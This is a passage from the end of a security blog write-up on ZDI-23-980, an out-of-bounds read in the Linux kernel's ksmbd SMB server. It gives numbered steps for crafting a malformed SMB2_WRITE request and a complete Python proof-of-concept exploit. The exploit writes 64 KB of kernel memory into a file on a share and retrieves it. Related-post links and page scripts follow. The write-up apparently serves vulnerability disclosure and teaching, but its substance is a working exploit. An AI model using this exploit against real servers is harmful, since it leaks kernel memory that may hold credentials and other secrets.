} __packed;</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_write_req</span></code><span style="white-space: pre-wrap;"> struct.</span></p></figcaption></figure><ol><li>Set <code>smb2_write_req-&gt;StructureSize = 49</code></li><li>Set <code>smb2_write_req-&gt;DataOffset = smb2_write_req-&gt;StructureSize + 64</code> to start reading the content without the packet</li><li>Set <code>smb2_write_req-&gt;Length = 65536</code> to write 65536 bytes from the packet to the file</li><li>Set <code>smb2_write_req-&gt;hdr.NextCommand = smb2_write_req-&gt;Length  + smb2_write_req-&gt;DataOffset</code> to spoof the request size</li><li>Open a file in the SMB share in read/write mode: <code>file_id = smb_open("dump.bin", "rw")</code></li><li>Set <code>smb2_write_req-&gt;PersistentFileId = file_id</code></li><li>Send the request</li><li>Read the file in the SMB share: <code>dump = smb_read(file_id)</code></li></ol><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3
from pwn import p64, p32, p16, p8


def main(username: str, password: str, share: str, filename: str):
    print("[*] connecting to SMB server...")
    conn = smb3.SMB3("127.0.0.1", "127.0.0.1", sess_port=445)

    print(f"[*] logging into SMB server in (username: '{username}', password: '{password}')...")
    conn.login(user=username, password=password)

    print(f"[*] connecting to tree/share: '{share}'")
    tree_id = conn.connectTree(share)

    packet = smb3.SMB3Packet()
    packet['Command'] = smb3.SMB2_WRITE

    StructureSize = 49
    DataOffset = 64 + StructureSize  # fixed packet size excl buffer
    Length = 0x10000  # max credits: 8096, so max buffer: 8096*8 (0x10000), but max IO size: 4*1024*1024 (0x400000)

    # this is ugly but acquires a RW handle for the '{filename}' file containing the memory
    file_id = conn.create(tree_id, filename, desiredAccess=smb3.FILE_READ_DATA|smb3.FILE_SHARE_WRITE, creationDisposition=smb3.FILE_OPEN|smb3.FILE_CREATE,
                            creationOptions=smb3.FILE_NON_DIRECTORY_FILE, fileAttributes=smb3.FILE_ATTRIBUTE_NORMAL, shareMode=smb3.FILE_SHARE_READ|smb3.FILE_SHARE_WRITE)

    packet["Data"] = (p16(StructureSize) + p16(DataOffset) + p32(Length) + p64(0) + file_id[:8] + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0))
    packet["TreeID"] = tree_id
    packet["NextCommand"] = DataOffset+Length  # the end of the buffer is past the end of the packet

    print(f"[*] sending OOB read for 65536 bytes... (writing to file '{filename}')")
    conn.sendSMB(packet)

    print("[*] closing file descriptors...")
    conn.close(tree_id, file_id)  # close fd's bcs impacket is impacket

    print(f"[*] reading file containing kernel memory: '{filename}'")
    conn.retrieveFile(share, filename, print)  # print file (containing kmem dump)


if __name__ == "__main__":
    main("user", "pass", "files", "dump.bin")</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-980</span></code><span style="white-space: pre-wrap;"> PoC exploit using </span><code spellcheck="false" style="white-space: pre-wrap;"><span>SMB_WRITE</span></code></p></figcaption></figure><h2 id="conclusion">Conclusion</h2><p>Thank you for reading my write-up on this Linux kernel vulnerability. I hope you learned about the ksmbd kernel subsystem and that you like the write-up style.</p><p>For questions, job inquiries, and other things, please send an email to <a href="mailto:notselwyn@pwning.tech" rel="noreferrer">notselwyn@pwning.tech</a> (<a href="https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc" rel="noreferrer">PGP key</a>).</p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd-syzkaller/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Tickling ksmbd: fuzzing SMB in the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-09-16">Sep 16, 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cve-2022-46640/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How I hacked IoT management apps: the story behind CVE-2022-46640
                </h2>
            </header>
                <div class="post-card-excerpt">Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                <span class="post-card-meta-length">8 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cve-2022-47758/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How I hacked smart lights: the story behind CVE-2022-47758
                </h2>
            </header>
                <div class="post-card-excerpt">In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp's firmware for unauthenticated remote code execution on the entire device with the highest privileges and</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                <span class="post-card-meta-length">16 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://pwning.tech">Pwning Tech</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=50a5a782cf"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js" integrity="sha512-3KphgbiKTzK2CNxlSgUKypipTV7tWknO5czNb+E7H4CeHOOSer2s2rIOCTuz8NsY1zm+B9tP9Ul2JX/tmdyOYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" integrity="sha512-QXFMVAusM85vUYDaNgcYeU3rzSlc+bTV4JvkfJhjxSHlQEo+ig53BtnGkvFTiNJh8D+wv6uWAQ2vJaVmxe8d3w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js" integrity="sha512-tBR4SAva+2bw36ToxaFeOEvgqxWHON25E9xp+kEBfw175sS5OusQEH8GrigKgTdHUXcKsK1yiyfo7fctBYl+rA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-toml.min.js" integrity="sha512-R9JG7uVdcjWlZvEWyP3KfxtexvT1uIlKUF/dYVmZRbvJyMobK6zGCpIM2gLVqYjLSYeL/zBjOVpP7vXxVtzfCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    $("pre").addClass("line-numbers");
</script>

<script>
      $('.gh-content').prepend('<aside class="gh-sidebar"><div class="gh-toc"></div></aside>');
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>
<script>
    tocbot.init({
        tocSelector: '.gh-toc',
        contentSelector: '.gh-content',
        headingSelector: 'h1, h2, h3, h4',
        hasInnerContainers: true,
  		collapseDepth: 2
    });
</script>

<script>
      $('.gh-toc').prepend('<h5>Table of contents</h5>');
</script>

<script>
  $('.gh-burger').attr('aria-label', 'menu button');
  $('.gh-search').attr('aria-label', 'search button');
  $(".author-name a").attr("aria-label", "author notselwyn");
  $(".author-profile-image").attr("aria-label", "author notselwyn");
</script>

</body>
</html>
